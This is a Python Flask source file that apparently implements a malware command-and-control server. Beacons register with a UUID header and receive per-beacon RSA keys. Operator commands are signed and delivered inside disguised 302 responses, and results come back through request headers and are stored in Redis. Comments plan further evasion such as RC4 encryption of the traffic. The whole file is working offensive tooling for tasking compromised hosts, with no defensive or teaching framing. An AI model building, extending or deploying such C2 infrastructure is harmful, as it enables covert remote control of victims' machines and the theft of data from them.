# beacons checking in supply a UUID that is hashed
# the hash is compared to a precompiled list of them?
# the uuid is stored in memory in a table
# but how are commands stored and retrieved
# maybe the tables are each named after the beacon
# so use postgresql to create a series of tables in a db
# the flask webserver sees the UUID then performs a fetch from the db
# e z p z
import base64
from datetime import datetime
from flask import *
import json
import redis
import string
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
import sys
import binascii

conn = redis.StrictRedis(host='localhost', port=6379, db=0)
app = Flask(__name__)


# Test formatting the key for storage
#print(base64.b64decode(encoded_key)) # and this gives us back the key warts and all

@app.route('/', methods=['GET'])
def home():
    print('start')
    # This handles initial registration
    # The beacon receives the initial reg and adds it to the db
    if request.method == 'GET':
        uuid = request.headers['APPSESSIONID']
        whoami = request.headers['Res']

        if set(uuid).difference(string.ascii_letters + string.digits):
            # We're not going to bother with input sanitization here
            # If we receive special characters just drop it entirely
            pass
        else:
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
            )
            print('made key')
            pem_public_key = private_key.public_key().public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            )
            print('test')
            with open('keys/'+uuid+".pem", "wb") as key_file: # Write the key value to the pem
                key_file.write(pem)
            structure = {
                "WhoAmI": f"{whoami}",
                "Signature": "0",
                "Retrieved": "0",  # Reset retrieved so we know the command was picked up
                "Command": "0",
                "LastInteraction": "0",
                "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
                "Result": "0",
                "GotIt": "0"
            }
            structure = json.dumps(structure)  # Dump the json
            # Write the message value to the beacon:UUID key
            conn.hset('UUID', uuid, structure)
            return ''


@app.route('/session', methods=['GET'])
def session():
    print('session')
    # This function handles the beacon requesting a command
    if request.method == 'GET':
        uuid = request.headers['APPSESSIONID']
        if set(uuid).difference(string.ascii_letters + string.digits):
            # We're not going to bother with input sanitization here
            # If we receive special characters just drop it entirely
            pass
        else:
            connt = conn.hget('UUID', uuid)  # Get the struct
            connt = connt.decode()  # Decode it from bytes
            connt = json.loads(connt)  # it's returned as string so convert it to dict
            structure = json.dumps(connt)  # Dump the dict to json
            connector = json.loads(structure)  # Load it into a new var
            command = connector["Command"]  # Grab the command var from the object
            LastInteraction = connector["LastInteraction"]
            result = connector["Result"]
            whoami = connector["WhoAmI"]

            command1 = bytes(command, 'utf-8') # To sign the command, it requires a bytes like object

            with open('keys/'+uuid + ".pem", "rb") as key_file: # Read in the pem file for the UUID
                private_key = serialization.load_pem_private_key(key_file.read(), password=None)

            signature = private_key.sign(command1, padding.PSS(mgf=padding.MGF1(hashes.SHA256()),
                                                              salt_length=padding.PSS.MAX_LENGTH), hashes.SHA256())
            signature = binascii.b2a_hex(signature).decode()
            # Set the command to 0
            structure = {
                "WhoAmI": f"{whoami}",
                "Signature": f"{signature}",
                "Retrieved": "1",  # Set retrieved to 1 so we know we got results
                "Command": "0",
                "LastInteraction": f"{LastInteraction}",
                "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
                "Result": f"{result}",
                "GotIt": "0"
            }
            structure = json.dumps(structure)  # Dump the json
            # Write the message value to the beacon:UUID key
            conn.hset('UUID', uuid, structure)
            signature = str(signature)
            resp = Response(
                response=command, status=302, mimetype="text/plain")
            resp.headers['Verifier'] = signature
            return resp  # we've really got to RC4 encrypt this


@app.route("/schema", methods=['GET'])
def schema():
    # This function handles beacons returning data
    # Grab the appsessionid value from the headers
    # We need to grab the corresponding private key from the key store to decrypt incoming messages with
    # Set a default value on checkin to create the hostname/whoami to identify the beacon [needs testing]
    uuid = request.headers['APPSESSIONID']
    result = request.headers['Res']

    command = conn.hget('UUID', uuid)  # Get the struct
    command = command.decode()  # Decode it from bytes
    command = json.loads(command)  # it's returned as string so convert it to dict
    structure = json.dumps(command)  # Dump the dict to json
    connector = json.loads(structure)  # Load it into a new var
    LastInteraction = connector["LastInteraction"]
    whoami = connector["WhoAmI"]
    #key = connector["private-key"]
    print(request.headers)
    if set(uuid).difference(string.ascii_letters + string.digits):
        # We're not going to bother with input sanitization here
        # If we receive special characters just drop it entirely
        pass
    else:
        # Let's convert the command struct to a JSON object
        structure = {
            "WhoAmI": f"{whoami}",
            "Signature": "0",
            "Retrieved": "1",  # Set retrieved to 1 so we know we got results
            "Command": "0",
            "LastInteraction": f"{LastInteraction}",
            "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
            "Result": f"{result}",
            "GotIt": "1"
        }
        structure = json.dumps(structure)  # Dump the json
        # Write the message value to the beacon:UUID key
        conn.hset('UUID', uuid, structure)
        return ''


def serve():
    app.run(host="localhost", port=8000)  # ssl_context='adhoc')


if __name__ == "__main__":
    serve()